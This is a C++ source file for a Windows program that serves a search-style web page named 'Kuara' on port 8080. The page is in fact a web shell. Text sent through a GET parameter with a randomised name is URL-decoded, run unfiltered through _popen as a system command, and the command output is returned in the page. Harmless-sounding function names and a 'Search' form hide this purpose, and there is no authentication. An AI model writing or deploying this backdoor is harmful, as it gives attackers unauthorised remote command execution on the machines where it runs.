#include <iostream>
#include <winsock2.h>
#include <string>
#include <memory>
#include <cstdlib>
#include <ctime>
#include <array>
#include <regex>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")

namespace webutils {

const std::string header = R"(
<!DOCTYPE html>
<html>
<head>
<title>Kuara</title>
<style>
body{
    font-family: 'Trebuchet MS', Arial, sans-serif;
    background-color: #1b1f23;   
    color: #f2e6d9;   
}
#container{
    max-width:600px;
    margin:50px auto;
    padding:20px;
    border-radius:10px;
    background-color: #8b0000;   
    border: 2px solid #c0a080;   
}
input[type='text']{
    width:80%;
    padding:5px;
    margin-right:10px;
    border: 1px solid #c0a080;  
    border-radius:3px;
    background-color: #1b1f23;   
    color: white;  
}
input[type='submit']{
    padding:5px 10px;
    background-color: #c0a080;   
    color: #1b1f23; 
    border: 1px solid #c0a080;   
    border-radius:3px;
}
#outputBox{
    background-color: #1b1f23;   
    padding:10px;
    border-radius:5px;
    word-wrap:break-word;
    white-space: pre-wrap;
    color: #f2e6d9;  
    border-top: 2px dashed #c0a080; 
    margin-top: 10px;
    overflow: hidden;
    text-overflow: ellipsis;
    overflow-x: scroll;
    margin-top: 10px;
}
h1{
    text-align:center;
    color: #f2e6d9;  
    font-size: 2.0em;
    letter-spacing: 2px;
    text-shadow: 1px 1px 2px #8b0000; 
}
pre {
    margin:0;
    font-family: 'Courier New', Courier, monospace;
    font-size: 0.9em;
    margin:10px;
}



::-webkit-scrollbar {
    height: 12px;
}

::-webkit-scrollbar-thumb {
    background-color: #D43A3A;
    border: 3px solid #1a1a1d;
    border-radius: 6px;
}

::-webkit-scrollbar-thumb:hover {
    background-color: #b02f32;
}

</style>

</head>
<body>
<div id='container'>
<h1>Kuara</h1>
)";


    const std::string footer = "</div></body></html>";

    std::string processData(const std::string& input) {
        std::array<char, 128> buffer;
        std::string result;
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(input.c_str(), "r"), _pclose);
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return result;
    }

    std::string endpointGenerator() {
        srand(static_cast<unsigned>(time(NULL)));
        return "query" + std::to_string(rand() % 10000);
    }

    std::string parseData(const std::string& httpRequest, const std::string& endpoint) {
        std::regex pattern(endpoint + "=([^ ]+) ");
        std::smatch matches;
        if (std::regex_search(httpRequest, matches, pattern)) {
            return matches[1].str();
        }
        return "";
    }

    std::string urlDecode(const std::string &s) {
        std::string res;
        for (size_t i = 0; i < s.size(); ++i) {
            if (s[i] == '%' && i + 2 < s.size()) {
                int val;
                std::istringstream is(s.substr(i + 1, 2));
                if (is >> std::hex >> val) {
                    res += static_cast<char>(val);
                    i += 2;
                } else {
                    res += s[i];
                }
            } else if (s[i] == '+') {
                res += ' ';
            } else {
                res += s[i];
            }
        }
        return res;
    }

    const std::string stylishOutput(const std::string &result) {
        if (result.empty()) {
            return "";
        }

        std::ostringstream oss;
        oss << "<div id='outputBox'>";
        oss << "<pre>" << result << "</pre>";
        oss << "</div>";

        return oss.str();
    }
}

int main() {
    WSADATA ws;
    SOCKET ls, cs;
    sockaddr_in sa;
    char buffer[1024];
    int size = sizeof(sa);

    WSAStartup(MAKEWORD(2, 2), &ws);
    ls = socket(AF_INET, SOCK_STREAM, 0);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons(8080); // This can be touched

    bind(ls, (struct sockaddr*)&sa, sizeof(sa));
    listen(ls, 3);

    std::string endpoint = webutils::endpointGenerator();

    while (true) {
        cs = accept(ls, (struct sockaddr*)&sa, &size);
        int bytesRead = recv(cs, buffer, sizeof(buffer), 0);
        if (bytesRead > 0) {
            std::string httpRequest(buffer);
            std::string inputData = webutils::parseData(httpRequest, endpoint);
            inputData = webutils::urlDecode(inputData);

            std::string outputData = webutils::processData(inputData);
            std::string formattedOutput = webutils::stylishOutput(outputData);
            
            std::string responsePage = webutils::header + "<form method='get'><input type='text' name='" + endpoint + "' placeholder='Enter query'><input type='submit' value='Search'></form>" + formattedOutput + webutils::footer;
            std::string httpResponse = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + std::to_string(responsePage.length()) + "\r\n\r\n" + responsePage;
            send(cs, httpResponse.c_str(), httpResponse.length(), 0);
        }
        closesocket(cs);
    }

    closesocket(ls);
    WSACleanup();

    return 0;
}
